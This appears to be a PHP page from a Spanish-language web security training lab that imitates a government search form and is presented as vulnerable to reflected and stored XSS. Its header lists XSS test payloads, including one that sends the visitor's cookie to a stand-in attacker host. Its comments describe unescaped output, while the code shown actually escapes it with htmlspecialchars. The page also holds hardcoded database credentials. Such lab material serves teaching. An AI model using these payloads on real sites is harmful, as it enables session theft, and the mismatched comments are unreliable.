<?php
/*
 * ============================================================
 * ARCHIVO: web/buscar.php
 * VECTOR:  V4 — Cross-Site Scripting Reflejado (XSS)
 * OWASP:   A03:2021 – Injection (XSS)
 * ============================================================
 * VULNERABILIDAD:
 *   El parámetro $_GET['q'] se imprime directamente en el HTML
 *   con echo sin ningún tipo de codificación ni sanitización.
 *
 * PAYLOADS DE PRUEBA:
 *   → Básico (PoC):
 *     ?q=<script>alert('XSS-OK')</script>
 *   → Sin etiqueta script:
 *     ?q=<img src=x onerror="alert('XSS-img')">
 *   → SVG:
 *     ?q=<svg onload=alert(1)>
 *   → Exfiltración de cookie:
 *     ?q=<script>document.location='http://atacante.com/?c='+document.cookie</script>
 *
 * ¡SOLO PARA USO EDUCATIVO EN ENTORNO CONTROLADO!
 * ============================================================
 */
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Buscar Trámite — SAT-LAB [VULNERABLE XSS]</title>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Open Sans', sans-serif;
            background: linear-gradient(135deg, #0654a3 0%, #00a4e4 100%);
            min-height: 100vh; padding: 30px 20px;
        }
        .wrapper { max-width: 700px; margin: 0 auto; }
        .top-bar {
            background: #0654a3; border-radius: 8px 8px 0 0;
            padding: 14px 22px; display: flex; justify-content: space-between; align-items: center;
            border-bottom: 3px solid #00a4e4;
        }
        .top-bar h1 { color: #fff; font-size: 15px; font-weight: 700; }
        .badge-vuln { background: #8e44ad; color: #fff; font-size: 10px; font-weight: 700; padding: 3px 10px; border-radius: 3px; letter-spacing: .5px; }
        .panel { background: rgba(255,255,255,0.96); border-radius: 0 0 8px 8px; padding: 28px; box-shadow: 0 8px 30px rgba(0,0,0,0.3); }
        .search-row { display: flex; gap: 10px; margin-bottom: 22px; }
        .search-row input {
            flex: 1; padding: 10px 14px; border: 1px solid #7a9ab0;
            border-radius: 4px; background: #c2d3dd; font-family: inherit; font-size: 13px;
        }
        .search-row input:focus { outline: none; border-color: #0654a3; background: #d8eaf4; }
        .search-row button {
            padding: 10px 18px; background: #0654a3; color: #fff; border: none;
            border-radius: 4px; font-family: inherit; font-size: 13px; font-weight: 700; cursor: pointer;
        }
        .search-row button:hover { background: #044a8e; }
        .xss-hint { background: #f3e5f5; border: 1px solid #8e44ad; border-radius: 4px; padding: 11px 14px; margin-bottom: 18px; font-size: 11px; color: #6c3483; line-height: 1.6; }
        .xss-hint strong { display: block; margin-bottom: 3px; font-size: 10px; text-transform: uppercase; letter-spacing: .5px; }
        .result-box { background: #eef4fb; border: 1px solid #c0d6e8; border-radius: 4px; padding: 14px 18px; min-height: 48px; font-size: 17px; font-weight: 700; color: #0654a3; word-break: break-all; }
        .result-label { font-size: 12px; color: #666; margin-bottom: 8px; }
        .btn-back { display: inline-block; margin-top: 22px; padding: 9px 18px; background: #0654a3; color: #fff; border-radius: 4px; text-decoration: none; font-size: 13px; font-weight: 600; }
        .btn-back:hover { background: #044a8e; }
    </style>
</head>
<body>
<div class="wrapper">
    <div class="top-bar">
        <h1>🔍 Buscar Papeleta / Trámite</h1>
    </div>
    <div class="panel">

        <!-- Formulario GET — el parámetro 'q' es el vector XSS -->
        <form action="buscar.php" method="GET" class="search-row">
            <input
                type="text"
                name="q"
                id="q"
                placeholder="Nº de papeleta, placa o expediente..."
                value="<?php
                    // ═══════════════════════════════════════════════════════
                    // VULNERABILIDAD: El value también imprime $_GET['q'] sin
                    // codificar, permitiendo: "><script>alert(1)</script>
                    // ═══════════════════════════════════════════════════════
                    if (isset($_GET['q'])) { echo htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8'); }
                    ///if (isset($_GET['q'])) { echo $_GET['q']; }

                ?>">
            <button type="submit">Buscar</button>
        </form>



<?php
if (isset($_GET['q']) && $_GET['q'] !== '') {

    echo "<p class='result-label'>Resultado de búsqueda para:</p>";
    echo "<div class='result-box'>";

    // ═══════════════════════════════════════════════════════════════
    // VULNERABILIDAD CWE-79: XSS REFLEJADO
    // echo imprime el valor de $_GET['q'] DIRECTAMENTE en el HTML.
    // El navegador interpreta cualquier etiqueta HTML o script
    // como código y lo ejecuta inmediatamente.
    //
    // Input:  <script>alert('XSS-OK')</script>
    // Output: <div class='result-box'><script>alert('XSS-OK')</script></div>
    //         → JavaScript ejecutado en el navegador de la víctima
    //
    // CORRECCIÓN (no aplicada aquí intencionalmente):
    //   echo htmlspecialchars($_GET['q'], ENT_QUOTES | ENT_HTML5, 'UTF-8');
    // ═══════════════════════════════════════════════════════════════
    echo htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');

    //echo $_GET['q'];   // ← PUNTO VULNERABLE PRINCIPAL

    echo "</div>";

} else {
    echo "<p style='color:#888;font-size:13px;margin-top:10px;'>Ingrese el número de papeleta, placa o trámite.</p>";
}
// XSS ALMACENADO: Conexión a BD y guardado del historial
$conn = new mysqli('sat_db', 'appuser', 'apppassword', 'sat_lab');
if (!$conn->connect_error) {
    if (isset($_GET['q']) && $_GET['q'] !== '') {
        $stmt = $conn->prepare("INSERT INTO historial_busquedas (busqueda) VALUES (?)");
        $stmt->bind_param("s", $_GET['q']);
        $stmt->execute();
    }
    
    echo "<div style='margin-top:30px; padding-top:20px; border-top:1px solid #c0d6e8;'>";
    echo "<p class='result-label' style='color:#d35400; font-weight:bold;'>Últimas búsquedas realizadas (Historial Público):</p>";
    
    $res = $conn->query("SELECT busqueda FROM historial_busquedas ORDER BY id DESC LIMIT 5");
    if ($res && $res->num_rows > 0) {
        while ($row = $res->fetch_assoc()) {
            echo "<div style='background:#fdfefe; padding:10px; border:1px solid #ddd; border-left: 3px solid #e74c3c; margin-bottom:8px; font-size:13px; color:#555;'>";
            // ═══════════════════════════════════════════════════════════════
            // PUNTO VULNERABLE: XSS ALMACENADO
            // Se imprime directamente de la base de datos sin sanitizar
            // ═══════════════════════════════════════════════════════════════
            echo htmlspecialchars($row['busqueda'], ENT_QUOTES, 'UTF-8');
            //echo $row['busqueda'];
            echo "</div>";
        }
    } else {
        echo "<p style='font-size:12px; color:#888;'>No hay búsquedas recientes.</p>";
    }
    echo "</div>";
}
?>
        <a href="javascript:history.back()" class="btn-back">← Volver</a>
    </div>
</div>
</body>
</html>
